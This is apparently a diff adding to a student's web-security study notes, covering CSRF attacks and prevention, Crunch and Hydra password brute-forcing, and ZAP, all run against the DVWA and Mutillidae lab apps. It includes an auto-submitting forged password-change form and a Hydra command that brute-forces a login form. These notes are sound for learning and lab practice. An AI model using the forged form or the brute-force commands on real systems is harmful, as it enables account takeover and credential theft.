@@ -631,6 +631,230 @@ echo '<pre>';
 echo 'Hello ' . htmlspecialchars($_GET['name']);
 echo '</pre>';
 
+CSRF
+----
+
+Cross Site Request Frogery
+- Requests are not validated at the server side.
+- Server does not check if the user generated the request.
+- Requests can be forged and send to users to make them do things they don't intend to do such as changing password.
+
+"Login to Mutillidae and check using Cookie Manager"
+
+In Firefox, download and add Cookie Manager from the following
+=> https://addons.mozilla.org/en-US/firefox/addon/a-cookie-manager/
+=> https://addons.mozilla.org/en-US/firefox/addon/cookie-quick-manager/
+
+"Login to DVWA"
+
+"Copy form code"
+
+<form action="http://192.168.104.6/dvwa/vulnerabilities/csrf/" method="GET">    
+    New password:<br>
+    <input type="password" AUTOCOMPLETE="off" name="password_new"><br>
+    Confirm new password: <br>
+    <input type="password" AUTOCOMPLETE="off" name="password_conf">
+    <br>
+    <input type="submit" value="Change" name="Change">
+</form>
+
+<form id="form1" action="http://192.168.104.6/dvwa/vulnerabilities/csrf/" method="GET">    
+    New password:<br>
+    <input type="hidden" AUTOCOMPLETE="off" name="password_new" value="replace_with_your_new_one"><br>
+    Confirm new password: <br>
+    <input type="hidden" AUTOCOMPLETE="off" name="password_conf" value="replace_with_your_new_one">
+</form>
+<script>document.getElementById('form1').submit();</script>
+
+CSRF - Prevention 
+----
+
+"Request user to enter current password."
+
+[Enter Current Password]
+
+[Enter New Password]
+
+[Enter Confirm New Password]
+
+"Use CSRF token in web forms (Server will only accept form if the unique token is returned)."
+
+<form action="http://192.168.104.6/dvwa/vulnerabilities/csrf/" method="GET">   
+    <input name="csrf-token" value="unique_web_form_token" type="hidden"></input> 
+    New password:<br>
+    <input type="password" AUTOCOMPLETE="off" name="password_new"><br>
+    Confirm new password: <br>
+    <input type="password" AUTOCOMPLETE="off" name="password_conf">
+    <br>
+    <input type="submit" value="Change" name="Change">
+</form>
+
+Dynamic Synchronizing Tokens
+
+1) Generate an unpredictable token.
+    - Token needs to be a large value.
+    - Must be randon
+    - Should be unique
+2) Embed it in web form.
+3) Verify token when the form is submitted.
+
+"Go to => http://192.168.104.6/mutillidae/index.php?page=add-to-your-blog.php"
+
+"Inspect page and it will see CSRF Token if there is choosed high security."
+
+Brute Force & Dictionary Attack
+-----------------------------
+
+Brute Force - try all possible combinations
+Dictionary - try passwords in the list only
+
+Used Tools - Crunch, Hydra
+
+Crunch - generate word list file
+Hydra - attack using Crunch word list
+
+> crunch --version
+
+crunch version 3.6
+
+Crunch can create a wordlist based on criteria you specify.  The output from crunch can be sent to the screen, file, or to another program.
+
+Usage: crunch <min> <max> [options]
+where min and max are numbers
+
+Please refer to the man page for instructions and examples on how to use crunch.
+
+> crunch 6 8 123abc$ -o word_list_file.txt -t a@@@@b
+
+> hydra --vesion
+
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+hydra: invalid option -- '-'
+
+> hydra -help
+
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]
+
+Options:
+  -R        restore a previous aborted/crashed session
+  -I        ignore an existing restore file (don't wait 10 seconds)
+  -S        perform an SSL connect
+  -s PORT   if the service is on a different default port, define it here
+  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
+  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
+  -x MIN:MAX:CHARSET  password bruteforce generation, type "-x -h" to get help
+  -y        disable use of symbols in bruteforce, see above
+  -r             rainy mode for password generation (-x)
+  -e nsr    try "n" null password, "s" login as pass and/or "r" reversed login
+  -u        loop around users, not passwords (effective! implied with -x)
+  -C FILE   colon separated "login:pass" format, instead of -L/-P options
+  -M FILE   list of servers to attack, one entry per line, ':' to specify port
+  -o FILE   write found login/password pairs to FILE instead of stdout
+  -b FORMAT specify the format for the -o FILE: text(default), json, jsonv1
+  -f / -F   exit when a login/pass pair is found (-M: -f per host, -F global)
+  -t TASKS  run TASKS number of connects in parallel per target (default: 16)
+  -T TASKS  run TASKS connects in parallel overall (for -M, default: 64)
+  -w / -W TIME  wait time for a response (32) / between connects per thread (0)
+  -c TIME   wait time per login attempt over all threads (enforces -t 1)
+  -4 / -6   use IPv4 (default) / IPv6 addresses (put always in [] also in -M)
+  -v / -V / -d  verbose mode / show login+pass for each attempt / debug mode 
+  -O        use old SSL v2 and v3
+  -K        do not redo failed attempts (good for -M mass scanning)
+  -q        do not print messages about connection errors
+  -U        service module usage details
+  -m OPT    options specific for a module, see -U output for information
+  -h        more command line options (COMPLETE HELP)
+  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)
+  service   the service to crack (see below for supported protocols)
+  OPT       some service modules support additional input (-U for module help)
+
+Supported services: adam6500 asterisk cisco cisco-enable cvs firebird ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp
+
+Hydra is a tool to guess/crack valid login/password pairs.
+Licensed under AGPL v3.0. The newest version is always available at;
+https://github.com/vanhauser-thc/thc-hydra
+Please don't use in military or secret service organizations, or for illegal
+purposes. (This is a wish and non-binding - most such people do not care about
+laws and ethics anyway - and tell themselves they are one of the good ones.)
+These services were not compiled in: afp ncp oracle sapr3 smb2.
+
+Use HYDRA_PROXY_HTTP or HYDRA_PROXY environment variables for a proxy setup.
+E.g. % export HYDRA_PROXY=socks5://l:p@127.0.0.1:9150 (or: socks4:// connect://)
+     % export HYDRA_PROXY=connect_and_socks_proxylist.txt  (up to 64 entries)
+     % export HYDRA_PROXY_HTTP=http://login:pass@proxy:8080
+     % export HYDRA_PROXY_HTTP=proxylist.txt  (up to 64 entries)
+
+Examples:
+  hydra -l user -P passlist.txt ftp://192.168.0.1
+  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
+  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
+  hydra -l admin -p password ftp://[192.168.0.0/24]/
+  hydra -L logins.txt -P pws.txt -M targets.txt ssh
+
+> hydra -U http-post-form
+
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-28 10:05:02
+
+Help for module http-post-form:
+============================================================================
+Module http-post-form requires the page and the parameters for the web form.
+
+By default this module is configured to follow a maximum of 5 redirections in
+a row. It always gathers a new cookie from the same URL without variables
+The parameters take three ":" separated values, plus optional values.
+(Note: if you need a colon in the option string as value, escape it with "\:", but do not escape a "\" with "\\".)
+
+Syntax:   <url>:<form parameters>:<condition string>[:<optional>[:<optional>]
+First is the page on the server to GET or POST to (URL).
+Second is the POST/GET variables (taken from either the browser, proxy, etc.
+ with url-encoded (resp. base64-encoded) usernames and passwords being replaced in the
+ "^USER^" (resp. "^USER64^") and "^PASS^" (resp. "^PASS64^") placeholders (FORM PARAMETERS)
+Third is the string that it checks for an *invalid* login (by default)
+ Invalid condition login check can be preceded by "F=", successful condition
+ login check must be preceded by "S=".
+ This is where most people get it wrong. You have to check the webapp what a
+ failed string looks like and put it in this parameter!
+The following parameters are optional:
+ (c|C)=/page/uri     to define a different page to gather initial cookies from
+ (g|G)=              skip pre-requests - only use this when no pre-cookies are required
+ (h|H)=My-Hdr\: foo   to send a user defined HTTP header with each request
+                 ^USER[64]^ and ^PASS[64]^ can also be put into these headers!
+                 Note: 'h' will add the user-defined header at the end
+                 regardless it's already being sent by Hydra or not.
+                 'H' will replace the value of that header if it exists, by the
+                 one supplied by the user, or add the header at the end
+Note that if you are going to put colons (:) in your headers you should escape them with a backslash (\).
+ All colons that are not option separators should be escaped (see the examples above and below).
+ You can specify a header without escaping the colons, but that way you will not be able to put colons
+ in the header value itself, as they will be interpreted by hydra as option separators.
+
+Examples:
+ "/login.php:user=^USER^&pass=^PASS^:incorrect"
+ "/login.php:user=^USER64^&pass=^PASS64^&colon=colon\:escape:S=authlog=.*success"
+ "/login.php:user=^USER^&pass=^PASS^&mid=123:authlog=.*failed"
+ "/:user=^USER&pass=^PASS^:failed:H=Authorization\: Basic dT1w:H=Cookie\: sessid=aaaa:h=X-User\: ^USER^:H=User-Agent\: wget"
+ "/exchweb/bin/auth/owaauth.dll:destination=http%3A%2F%2F<target>%2Fexchange&flags=0&username=<domain>%5C^USER^&password=^PASS^&SubmitCreds=x&trusted=0:reason=:C=/exchweb"
+
+> hydra [ip_address] -l [username] -P [password] [service]
+
+> hydra 192.168.104.6 -l zaw -P wordlist.txt http-post-form "/mutillidae/index.php?page=login.php:username=^USER^&password=^PASS^&login-php-submit-button=Login:F=Not Logged In"
+
+ZAD Attack Proxy - ZAP
+----------------
+
+- Auto find vulnerabilities in web app
+- free and easy to use
+- can also be used for manual testing
+
+Used tool - ZAP
+
+
+
 
 
 
